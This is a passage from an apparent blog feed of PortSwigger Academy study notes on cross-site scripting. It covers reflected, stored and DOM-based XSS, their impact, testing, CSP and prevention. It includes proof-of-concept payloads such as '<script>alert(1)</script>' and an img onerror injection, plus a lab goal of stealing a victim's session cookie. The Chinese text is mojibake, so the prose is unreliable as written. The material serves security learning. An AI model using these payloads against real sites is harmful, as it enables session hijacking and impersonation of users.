<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/search?term=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¯¥ URL ä¼šå¾—åˆ°ä»¥ä¸‹å“åº”ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœåº”ç”¨ç¨‹åºçš„å…¶ä»–ç”¨æˆ·è¯·æ±‚æ”»å‡»è€…çš„ URLï¼Œé‚£ä¹ˆæ”»å‡»è€…æä¾›çš„è„šæœ¬å°±ä¼šåœ¨å—å®³è€…ç”¨æˆ·çš„æµè§ˆå™¨ä¸­ï¼Œåœ¨å…¶ä¸åº”ç”¨ç¨‹åºçš„ä¼šè¯ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚</p>
<h3 id="Lab-å°†-XSS-åæ˜ åˆ°æœªç¼–ç çš„-HTML-ä¸Šä¸‹æ–‡ä¸­">Lab: å°† XSS åæ˜ åˆ°æœªç¼–ç çš„ HTML ä¸Šä¸‹æ–‡ä¸­</h3>
<p>ç›´æ¥åœ¨æœç´¢æ¡†æœç´¢ <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> å°±é€šå…³äº†</p>
<h3 id="åå°„å¼-XSS-æ”»å‡»çš„å½±å“">åå°„å¼ XSS æ”»å‡»çš„å½±å“</h3>
<p>å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è€…æµè§ˆå™¨ä¸­æ‰§è¡Œçš„è„šæœ¬ï¼Œé‚£ä¹ˆä»–ä»¬é€šå¸¸å°±å¯ä»¥å®Œå…¨æ§åˆ¶è¯¥ç”¨æˆ·ã€‚å…¶ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åœ¨åº”ç”¨ç¨‹åºå†…æ‰§è¡Œç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„ä»»ä½•æ“ä½œã€‚</p>
</li>
<li class="lvl-2">
<p>æŸ¥çœ‹ç”¨æˆ·å¯ä»¥æŸ¥çœ‹çš„ä»»ä½•ä¿¡æ¯ã€‚</p>
</li>
<li class="lvl-2">
<p>ä¿®æ”¹ç”¨æˆ·å¯ä»¥ä¿®æ”¹çš„ä»»ä½•ä¿¡æ¯ã€‚</p>
</li>
<li class="lvl-2">
<p>å¯åŠ¨ä¸å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·çš„äº¤äº’ï¼ŒåŒ…æ‹¬æ¶æ„æ”»å‡»ï¼Œè¿™äº›æ”»å‡»çœ‹ä¼¼æ¥è‡ªæœ€åˆçš„å—å®³ç”¨æˆ·ã€‚</p>
</li>
</ul>
<p>æ”»å‡»è€…å¯ä»¥é€šè¿‡å„ç§æ‰‹æ®µè¯±ä½¿å—å®³ç”¨æˆ·å‘å‡ºå—å…¶æ§åˆ¶çš„è¯·æ±‚ï¼Œä»è€Œå®æ–½åå°„ XSS æ”»å‡»ã€‚è¿™äº›æ‰‹æ®µåŒ…æ‹¬åœ¨æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ä¸Šæˆ–å…è®¸ç”Ÿæˆå†…å®¹çš„å…¶ä»–ç½‘ç«™ä¸Šæ”¾ç½®é“¾æ¥ï¼Œæˆ–åœ¨ç”µå­é‚®ä»¶ã€æ¨ç‰¹æˆ–å…¶ä»–ä¿¡æ¯ä¸­å‘é€é“¾æ¥ã€‚æ”»å‡»å¯ä»¥ç›´æ¥é’ˆå¯¹å·²çŸ¥ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥æ˜¯é’ˆå¯¹åº”ç”¨ç¨‹åºä»»ä½•ç”¨æˆ·çš„æ— å·®åˆ«æ”»å‡»ã€‚</p>
<p>æ”»å‡»éœ€è¦å¤–éƒ¨ä¼ é€’æœºåˆ¶ï¼Œè¿™æ„å‘³ç€åå°„ XSS çš„å½±å“é€šå¸¸ä¸å¦‚å­˜å‚¨ XSS ä¸¥é‡ï¼Œå› ä¸ºå­˜å‚¨ XSS å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºå†…éƒ¨ä¼ é€’è‡ªå¸¦çš„æ”»å‡»ã€‚</p>
<h3 id="åˆ©ç”¨è·¨ç«™ç‚¹è„šæœ¬æ¼æ´">åˆ©ç”¨è·¨ç«™ç‚¹è„šæœ¬æ¼æ´</h3>
<p>è¯æ˜å‘ç°è·¨ç«™è„šæœ¬æ¼æ´çš„ä¼ ç»Ÿæ–¹æ³•æ˜¯ä½¿ç”¨ alert() å‡½æ•°åˆ›å»ºä¸€ä¸ªå¼¹å‡ºçª—å£ã€‚è¿™å¹¶ä¸æ˜¯å› ä¸º XSS ä¸å¼¹å‡ºçª—å£æœ‰ä»€ä¹ˆå…³ç³»ï¼›è¿™åªæ˜¯ä¸€ç§è¯æ˜æ‚¨å¯ä»¥åœ¨ç»™å®šåŸŸä¸Šæ‰§è¡Œä»»æ„ JavaScript çš„æ–¹æ³•ã€‚æ‚¨å¯èƒ½ä¼šæ³¨æ„åˆ°æœ‰äº›äººä½¿ç”¨ alert(document.domain)ã€‚è¿™æ˜¯ä¸€ç§æ˜ç¡®è¯´æ˜ JavaScript åœ¨å“ªä¸ªåŸŸä¸Šæ‰§è¡Œçš„æ–¹æ³•ã€‚</p>
<p>æœ‰æ—¶ï¼Œä½ ä¼šæƒ³æ›´è¿›ä¸€æ­¥ï¼Œé€šè¿‡æä¾›ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨æ¥è¯æ˜ XSS æ¼æ´æ˜¯ä¸€ä¸ªçœŸæ­£çš„å¨èƒã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨ä¸‰ç§æœ€å¸¸ç”¨ã€æœ€å¼ºå¤§çš„ XSS æ¼æ´åˆ©ç”¨æ–¹æ³•ã€‚</p>
<h4 id="åˆ©ç”¨è·¨ç«™è„šæœ¬çªƒå–-cookie">åˆ©ç”¨è·¨ç«™è„šæœ¬çªƒå– cookie</h4>
<p>çªƒå– cookie æ˜¯ä¸€ç§åˆ©ç”¨ XSS çš„ä¼ ç»Ÿæ–¹æ³•ã€‚å¤§å¤šæ•°ç½‘ç»œåº”ç”¨ç¨‹åºéƒ½ä½¿ç”¨ cookie è¿›è¡Œä¼šè¯å¤„ç†ã€‚æ‚¨å¯ä»¥åˆ©ç”¨è·¨ç«™è„šæœ¬æ¼æ´ï¼Œå°†å—å®³è€…çš„ cookie å‘é€åˆ°è‡ªå·±çš„åŸŸï¼Œç„¶åæ‰‹åŠ¨å°† cookie æ³¨å…¥æµè§ˆå™¨å¹¶å‡å†’å—å®³è€…ã€‚</p>
<p>å®é™…ä¸Šï¼Œè¿™ç§æ–¹æ³•æœ‰å¾ˆå¤§çš„å±€é™æ€§ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å—å®³è€…å¯èƒ½æ²¡æœ‰ç™»å½•ã€‚</p>
</li>
<li class="lvl-2">
<p>è®¸å¤šåº”ç”¨ç¨‹åºä¼šä½¿ç”¨ HttpOnly æ ‡å¿—å¯¹ JavaScript éšè— cookieã€‚</p>
</li>
<li class="lvl-2">
<p>ä¼šè¯å¯èƒ½è¢«å…¶ä»–å› ç´ é”å®šï¼Œå¦‚ç”¨æˆ·çš„ IP åœ°å€ã€‚</p>
</li>
<li class="lvl-2">
<p>ä¼šè¯å¯èƒ½ä¼šåœ¨ä½ åŠ«æŒä¹‹å‰è¶…æ—¶ã€‚</p>
</li>
</ul>
<h4 id="Labï¼š-åˆ©ç”¨è·¨ç«™è„šæœ¬çªƒå–-cookie">Labï¼š åˆ©ç”¨è·¨ç«™è„šæœ¬çªƒå– cookie</h4>
<p>æœ¬å®éªŒå®¤åŒ…å«åšå®¢è¯„è®ºåŠŸèƒ½ä¸­çš„å­˜å‚¨ XSS æ¼æ´ã€‚æ¨¡æ‹Ÿå—å®³è€…ç”¨æˆ·ä¼šæŸ¥çœ‹å‘å¸ƒåçš„æ‰€æœ‰è¯„è®ºã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œåˆ©ç”¨è¯¥æ¼æ´æ¸—å‡ºå—å®³è€…çš„ä¼šè¯ cookieï¼Œç„¶åä½¿ç”¨è¯¥ cookie å†’å……å—å®³è€…ã€‚</p>
<h3 id="ä¸åŒæƒ…å†µä¸‹çš„åå°„-XSS">ä¸åŒæƒ…å†µä¸‹çš„åå°„ XSS</h3>
<h2 id="å­˜å‚¨å‹XSS">å­˜å‚¨å‹XSS</h2>
<p>å½“åº”ç”¨ç¨‹åºä»ä¸å—ä¿¡ä»»çš„æ¥æºæ¥æ”¶æ•°æ®ï¼Œå¹¶ä»¥ä¸å®‰å…¨çš„æ–¹å¼å°†è¿™äº›æ•°æ®åŒ…å«åœ¨éšåçš„ HTTP å“åº”ä¸­æ—¶ï¼Œå°±ä¼šäº§ç”Ÿå­˜å‚¨ XSSï¼ˆä¹Ÿç§°ä¸ºæŒä¹…æˆ–äºŒé˜¶ XSSï¼‰ã€‚</p>
<p>æœ‰å…³æ•°æ®å¯èƒ½æ˜¯é€šè¿‡ HTTP è¯·æ±‚æäº¤ç»™åº”ç”¨ç¨‹åºçš„ï¼›ä¾‹å¦‚ï¼Œåšå®¢æ–‡ç« ä¸Šçš„è¯„è®ºã€èŠå¤©å®¤ä¸­çš„ç”¨æˆ·æ˜µç§°æˆ–å®¢æˆ·è®¢å•ä¸Šçš„è¯¦ç»†è”ç³»ä¿¡æ¯ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œæ•°æ®å¯èƒ½æ¥è‡ªå…¶ä»–ä¸å—ä¿¡ä»»çš„æ¥æºï¼›ä¾‹å¦‚ï¼Œæ˜¾ç¤ºé€šè¿‡ SMTP æ”¶åˆ°çš„é‚®ä»¶çš„ç½‘ç»œé‚®ä»¶åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºç¤¾äº¤åª’ä½“å¸–å­çš„è¥é”€åº”ç”¨ç¨‹åºæˆ–æ˜¾ç¤ºç½‘ç»œæµé‡æ•°æ®åŒ…çš„ç½‘ç»œç›‘æ§åº”ç”¨ç¨‹åºã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå­˜å‚¨ XSS æ¼æ´çš„ç®€å•ç¤ºä¾‹ã€‚ä¸€ä¸ªç•™è¨€æ¿åº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·æäº¤ä¿¡æ¯ï¼Œå¹¶æ˜¾ç¤ºç»™å…¶ä»–ç”¨æˆ·ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, this is my message!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åº”ç”¨ç¨‹åºä¸ä¼šå¯¹æ•°æ®è¿›è¡Œä»»ä½•å…¶ä»–å¤„ç†ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥è½»æ¾å‘é€æ”»å‡»å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="åŸºäº-DOM-çš„è·¨ç«™ç‚¹è„šæœ¬">åŸºäº DOM çš„è·¨ç«™ç‚¹è„šæœ¬</h2>
<p>åŸºäº DOM çš„ XSSï¼ˆä¹Ÿç§° DOM XSSï¼‰æ˜¯æŒ‡åº”ç”¨ç¨‹åºåŒ…å«ä¸€äº›å®¢æˆ·ç«¯ JavaScriptï¼Œè¿™äº› JavaScript ä»¥ä¸å®‰å…¨çš„æ–¹å¼å¤„ç†æ¥è‡ªä¸ä¿¡ä»»æºçš„æ•°æ®ï¼Œé€šå¸¸æ˜¯å°†æ•°æ®å†™å› DOMã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œåº”ç”¨ç¨‹åºä½¿ç”¨ JavaScript ä»è¾“å…¥å­—æ®µè¯»å–å€¼ï¼Œå¹¶å°†è¯¥å€¼å†™å…¥ HTML ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search&#x27;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> results = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;results&#x27;</span>);</span><br><span class="line">results.<span class="property">innerHTML</span> = <span class="string">&#x27;You searched for: &#x27;</span> + search;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶è¾“å…¥å­—æ®µçš„å€¼ï¼Œä»–ä»¬å°±å¯ä»¥è½»æ¾æ„å»ºä¸€ä¸ªæ¶æ„å€¼ï¼Œä»è€Œæ‰§è¡Œè‡ªå·±çš„è„šæœ¬ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">You</span> searched <span class="attr">for</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&#x27;/* Bad stuff here... */&#x27;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>åœ¨å…¸å‹çš„æƒ…å†µä¸‹ï¼Œè¾“å…¥å­—æ®µå°†ç”± HTTP è¯·æ±‚çš„ä¸€éƒ¨åˆ†å¡«å……ï¼Œå¦‚ URL æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°ï¼Œä»è€Œå…è®¸æ”»å‡»è€…ä½¿ç”¨æ¶æ„ URL è¿›è¡Œæ”»å‡»ï¼Œå…¶æ–¹å¼ä¸åå°„ XSS ç›¸åŒã€‚</p>
<h2 id="XSS-å¯ä»¥ç”¨æ¥åšä»€ä¹ˆï¼Ÿ">XSS å¯ä»¥ç”¨æ¥åšä»€ä¹ˆï¼Ÿ</h2>
<p>åˆ©ç”¨è·¨ç«™è„šæœ¬æ¼æ´çš„æ”»å‡»è€…é€šå¸¸èƒ½å¤Ÿï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å†’å……æˆ–ä¼ªè£…æˆå—å®³ç”¨æˆ·ã€‚</p>
</li>
<li class="lvl-2">
<p>æ‰§è¡Œç”¨æˆ·èƒ½å¤Ÿæ‰§è¡Œçš„ä»»ä½•æ“ä½œã€‚</p>
</li>
<li class="lvl-2">
<p>è¯»å–ç”¨æˆ·èƒ½å¤Ÿè®¿é—®çš„ä»»ä½•æ•°æ®ã€‚</p>
</li>
<li class="lvl-2">
<p>è·å–ç”¨æˆ·çš„ç™»å½•å‡­è¯ã€‚</p>
</li>
<li class="lvl-2">
<p>å¯¹ç½‘ç«™è¿›è¡Œè™šæ‹Ÿç¯¡æ”¹ã€‚</p>
</li>
<li class="lvl-2">
<p>åœ¨ç½‘ç«™ä¸­æ³¨å…¥æœ¨é©¬åŠŸèƒ½ã€‚</p>
</li>
</ul>
<h2 id="XSS-æ¼æ´çš„å½±å“">XSS æ¼æ´çš„å½±å“</h2>
<p>XSS æ”»å‡»çš„å®é™…å½±å“é€šå¸¸å–å†³äºåº”ç”¨ç¨‹åºçš„æ€§è´¨ã€åŠŸèƒ½å’Œæ•°æ®ï¼Œä»¥åŠè¢«æ”»å‡»ç”¨æˆ·çš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åœ¨å°å†Œå­è½¯ä»¶åº”ç”¨ç¨‹åºä¸­ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½æ˜¯åŒ¿åçš„ï¼Œæ‰€æœ‰ä¿¡æ¯éƒ½æ˜¯å…¬å¼€çš„ï¼Œå› æ­¤å½±å“é€šå¸¸å¾ˆå°ã€‚</p>
</li>
<li class="lvl-2">
<p>åœ¨æŒæœ‰æ•æ„Ÿæ•°æ®ï¼ˆå¦‚é“¶è¡Œäº¤æ˜“ã€ç”µå­é‚®ä»¶æˆ–åŒ»ç–—è®°å½•ï¼‰çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå½±å“é€šå¸¸ä¼šå¾ˆä¸¥é‡ã€‚</p>
</li>
<li class="lvl-2">
<p>å¦‚æœè¢«å…¥ä¾µçš„ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­æ‹¥æœ‰æ›´é«˜çš„æƒé™ï¼Œé‚£ä¹ˆå½±å“é€šå¸¸ä¼šéå¸¸ä¸¥é‡ï¼Œæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å­˜åœ¨æ¼æ´çš„åº”ç”¨ç¨‹åºï¼Œå¹¶å…¥ä¾µæ‰€æœ‰ç”¨æˆ·åŠå…¶æ•°æ®ã€‚</p>
</li>
</ul>
<h2 id="å¦‚ä½•æŸ¥æ‰¾å’Œæµ‹è¯•-XSS-æ¼æ´">å¦‚ä½•æŸ¥æ‰¾å’Œæµ‹è¯• XSS æ¼æ´</h2>
<p>ç»å¤§å¤šæ•° XSS æ¼æ´éƒ½å¯ä»¥é€šè¿‡ Burp Suite çš„ç½‘ç»œæ¼æ´æ‰«æä»ªå¿«é€Ÿã€å¯é åœ°å‘ç°ã€‚</p>
<p>æ‰‹åŠ¨æµ‹è¯•åå°„å’Œå­˜å‚¨çš„ XSS é€šå¸¸æ¶‰åŠå‘åº”ç”¨ç¨‹åºä¸­çš„æ¯ä¸ªå…¥å£ç‚¹æäº¤ä¸€äº›ç®€å•çš„å”¯ä¸€è¾“å…¥ï¼ˆå¦‚ä¸€ä¸ªç®€çŸ­çš„å­—æ¯æ•°å­—å­—ç¬¦ä¸²ï¼‰ï¼Œè¯†åˆ«åœ¨ HTTP å“åº”ä¸­è¿”å›æ‰€æäº¤è¾“å…¥çš„æ¯ä¸ªä½ç½®ï¼Œå¹¶å¯¹æ¯ä¸ªä½ç½®è¿›è¡Œå•ç‹¬æµ‹è¯•ï¼Œä»¥ç¡®å®šé€‚å½“åˆ¶ä½œçš„è¾“å…¥æ˜¯å¦å¯ç”¨äºæ‰§è¡Œä»»æ„ JavaScriptã€‚é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæ‚¨å¯ä»¥ç¡®å®šå‘ç”Ÿ XSS çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©åˆé€‚çš„æœ‰æ•ˆè½½è·åŠ ä»¥åˆ©ç”¨ã€‚</p>
<p>æ‰‹åŠ¨æµ‹è¯•ç”± URL å‚æ•°å¼•èµ·çš„åŸºäº DOM çš„ XSS æ¶‰åŠç±»ä¼¼çš„è¿‡ç¨‹ï¼šåœ¨å‚æ•°ä¸­æ”¾ç½®ä¸€äº›ç®€å•çš„å”¯ä¸€è¾“å…¥ï¼Œä½¿ç”¨æµè§ˆå™¨çš„å¼€å‘å·¥å…·åœ¨ DOM ä¸­æœç´¢è¯¥è¾“å…¥ï¼Œå¹¶æµ‹è¯•æ¯ä¸ªä½ç½®ä»¥ç¡®å®šå…¶æ˜¯å¦å¯è¢«åˆ©ç”¨ã€‚ç„¶è€Œï¼Œå…¶ä»–ç±»å‹çš„ DOM XSS æ›´éš¾æ£€æµ‹ã€‚è¦åœ¨éåŸºäº URL çš„è¾“å…¥ï¼ˆå¦‚ document.cookieï¼‰æˆ–éåŸºäº HTML çš„æ±‡ï¼ˆå¦‚ setTimeoutï¼‰ä¸­å‘ç°åŸºäº DOM çš„æ¼æ´ï¼Œå®¡æŸ¥ JavaScript ä»£ç æ˜¯ä¸å¯æ›¿ä»£çš„ï¼Œè€Œå®¡æŸ¥ JavaScript ä»£ç å¯èƒ½éå¸¸è€—æ—¶ã€‚Burp Suite çš„ç½‘ç»œæ¼æ´æ‰«æå™¨ç»“åˆäº† JavaScript çš„é™æ€å’ŒåŠ¨æ€åˆ†æï¼Œèƒ½å¤Ÿå¯é åœ°è‡ªåŠ¨æ£€æµ‹åŸºäº DOM çš„æ¼æ´ã€‚</p>
<h2 id="å†…å®¹å®‰å…¨æ”¿ç­–">å†…å®¹å®‰å…¨æ”¿ç­–</h2>
<p>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰æ˜¯ä¸€ç§æµè§ˆå™¨æœºåˆ¶ï¼Œæ—¨åœ¨å‡è½»è·¨ç«™è„šæœ¬å’Œå…¶ä»–ä¸€äº›æ¼æ´çš„å½±å“ã€‚å¦‚æœé‡‡ç”¨ CSP çš„åº”ç”¨ç¨‹åºåŒ…å«ç±»ä¼¼ XSS çš„è¡Œä¸ºï¼Œé‚£ä¹ˆ CSP å¯èƒ½ä¼šé˜»ç¢æˆ–é˜»æ­¢å¯¹æ¼æ´çš„åˆ©ç”¨ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒCSP å¯è¢«è§„é¿ï¼Œä»¥ä¾¿åˆ©ç”¨åº•å±‚æ¼æ´ã€‚</p>
<h2 id="æ‚¬æŒ‚æ ‡è®°æ³¨å…¥">æ‚¬æŒ‚æ ‡è®°æ³¨å…¥</h2>
<p>æ‚¬å‚æ ‡è®°æ³¨å…¥æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œå¯ç”¨äºåœ¨ç”±äºè¾“å…¥è¿‡æ»¤å™¨æˆ–å…¶ä»–é˜²å¾¡æªæ–½è€Œæ— æ³•è¿›è¡Œå…¨é¢è·¨ç«™è„šæœ¬æ”»å‡»çš„æƒ…å†µä¸‹è·¨åŸŸæ•è·æ•°æ®ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸å¯ç”¨äºæ•è·å…¶ä»–ç”¨æˆ·å¯è§çš„æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯ç”¨äºä»£è¡¨ç”¨æˆ·æ‰§è¡Œæœªæˆæƒæ“ä½œçš„ CSRF æ ‡è®°ã€‚</p>
<h2 id="å¦‚ä½•é˜²æ­¢-XSS-æ”»å‡»">å¦‚ä½•é˜²æ­¢ XSS æ”»å‡»</h2>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œé˜²æ­¢è·¨ç«™è„šæœ¬æ˜¯ä¸€ä»¶å°äº‹ï¼Œä½†æ ¹æ®åº”ç”¨ç¨‹åºçš„å¤æ‚ç¨‹åº¦å’Œå¤„ç†ç”¨æˆ·å¯æ§æ•°æ®çš„æ–¹å¼ï¼Œé˜²æ­¢è·¨ç«™è„šæœ¬å¯èƒ½è¦éš¾å¾—å¤šã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰æ•ˆé˜²æ­¢ XSS æ¼æ´å¯èƒ½éœ€è¦ç»“åˆä»¥ä¸‹æªæ–½ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åœ¨è¾“å…¥åˆ°è¾¾æ—¶è¿›è¡Œè¿‡æ»¤ã€‚åœ¨æ¥æ”¶ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå°½å¯èƒ½ä¸¥æ ¼åœ°æ ¹æ®é¢„æœŸæˆ–æœ‰æ•ˆè¾“å…¥è¿›è¡Œè¿‡æ»¤ã€‚</p>
</li>
<li class="lvl-2">
<p>å¯¹è¾“å‡ºæ•°æ®è¿›è¡Œç¼–ç ã€‚åœ¨ HTTP å“åº”ä¸­è¾“å‡ºç”¨æˆ·å¯æ§æ•°æ®æ—¶ï¼Œè¦å¯¹è¾“å‡ºè¿›è¡Œç¼–ç ï¼Œé˜²æ­¢å…¶è¢«è§£é‡Šä¸ºæ´»åŠ¨å†…å®¹ã€‚æ ¹æ®è¾“å‡ºä¸Šä¸‹æ–‡ï¼Œè¿™å¯èƒ½éœ€è¦åº”ç”¨ HTMLã€URLã€JavaScript å’Œ CSS ç¼–ç çš„ç»„åˆã€‚</p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨é€‚å½“çš„å“åº”æ ‡å¤´ã€‚ä¸ºé˜²æ­¢åœ¨ä¸æ‰“ç®—åŒ…å«ä»»ä½• HTML æˆ– JavaScript çš„ HTTP å“åº”ä¸­å‡ºç° XSSï¼Œå¯ä»¥ä½¿ç”¨ <code>Content-Type</code> å’Œ <code>X-Content-Type-Options</code> æ ‡å¤´ï¼Œç¡®ä¿æµè§ˆå™¨æŒ‰æ‚¨çš„æ„å›¾è§£é‡Šå“åº”ã€‚</p>
</li>
<li class="lvl-2">
<p>å†…å®¹å®‰å…¨ç­–ç•¥ã€‚ä½œä¸ºæœ€åä¸€é“é˜²çº¿ï¼Œä½ å¯ä»¥ä½¿ç”¨å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰æ¥é™ä½ä»ç„¶å­˜åœ¨çš„ä»»ä½• XSS æ¼æ´çš„ä¸¥é‡æ€§ã€‚</p>
</li>
</ul>
<p>å¯¹è¾“å‡ºæ•°æ®è¿›è¡Œç¼–ç ã€‚åœ¨ HTTP å“åº”ä¸­è¾“å‡ºç”¨æˆ·å¯æ§æ•°æ®æ—¶ï¼Œè¦å¯¹è¾“å‡ºè¿›è¡Œç¼–ç ï¼Œé˜²æ­¢å…¶è¢«è§£é‡Šä¸ºæ´»åŠ¨å†…å®¹ã€‚æ ¹æ®è¾“å‡ºä¸Šä¸‹æ–‡ï¼Œè¿™å¯èƒ½éœ€è¦åº”ç”¨ HTMLã€URLã€JavaScript å’Œ CSS ç¼–ç çš„ç»„åˆã€‚</p>
<h2 id="æœ‰å…³è·¨ç«™è„šæœ¬çš„å¸¸è§é—®é¢˜">æœ‰å…³è·¨ç«™è„šæœ¬çš„å¸¸è§é—®é¢˜</h2>
<p>XSS æ¼æ´æœ‰å¤šå¸¸è§ï¼ŸXSS æ¼æ´éå¸¸å¸¸è§ï¼ŒXSS å¯èƒ½æ˜¯æœ€å¸¸å‡ºç°çš„ç½‘ç»œå®‰å…¨æ¼æ´ã€‚</p>
<p>XSS æ”»å‡»æœ‰å¤šå¸¸è§ï¼Ÿå¾ˆéš¾è·å¾—æœ‰å…³çœŸå®ä¸–ç•Œä¸­ XSS æ”»å‡»çš„å¯é æ•°æ®ï¼Œä½†å®ƒè¢«åˆ©ç”¨çš„é¢‘ç‡å¯èƒ½ä½äºå…¶ä»–æ¼æ´ã€‚</p>
<p>XSS å’Œ CSRF æœ‰ä»€ä¹ˆåŒºåˆ«ï¼ŸXSS æ¶‰åŠå¯¼è‡´ç½‘ç«™è¿”å›æ¶æ„ JavaScriptï¼Œè€Œ CSRF æ¶‰åŠè¯±ä½¿å—å®³ç”¨æˆ·æ‰§è¡Œä»–ä»¬æ— æ„æ‰§è¡Œçš„æ“ä½œã€‚</p>
<p>XSS ä¸ SQL æ³¨å…¥æœ‰ä½•åŒºåˆ«ï¼ŸXSS æ˜¯é’ˆå¯¹å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·çš„å®¢æˆ·ç«¯æ¼æ´ï¼Œè€Œ SQL æ³¨å…¥æ˜¯é’ˆå¯¹åº”ç”¨ç¨‹åºæ•°æ®åº“çš„æœåŠ¡å™¨ç«¯æ¼æ´ã€‚</p>
<p>å¦‚ä½•åœ¨ PHP ä¸­é˜²æ­¢ XSSï¼Ÿä½¿ç”¨å…è®¸å­—ç¬¦çš„ç™½åå•è¿‡æ»¤è¾“å…¥ï¼Œå¹¶ä½¿ç”¨ç±»å‹æç¤ºæˆ–ç±»å‹è½¬æ¢ã€‚åœ¨ HTML ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ <code>htmlentities</code> å’Œ <code>ENT_QUOTES</code> å¯¹è¾“å‡ºè¿›è¡Œè½¬ä¹‰ï¼Œåœ¨ JavaScript ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ JavaScript Unicode è½¬ä¹‰ã€‚</p>
<p>å¦‚ä½•åœ¨ Java ä¸­é˜²æ­¢ XSSï¼Ÿä½¿ç”¨å…è®¸å­—ç¬¦ç™½åå•è¿‡æ»¤è¾“å…¥ï¼Œä½¿ç”¨ Google Guava ç­‰åº“å¯¹ HTML ä¸Šä¸‹æ–‡çš„è¾“å‡ºè¿›è¡Œ HTML ç¼–ç ï¼Œæˆ–ä½¿ç”¨ JavaScript Unicode è½¬ä¹‰å¯¹ JavaScript ä¸Šä¸‹æ–‡è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¶åœºç»ƒä¹ </category>
      </categories>
      <tags>
        <tag>PortSwiggeré¶åœº</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€PortSwiggerå­¦é™¢ã€‘SQL æ³¨å…¥</title>
    <url>/posts/3b7c6011/</url>
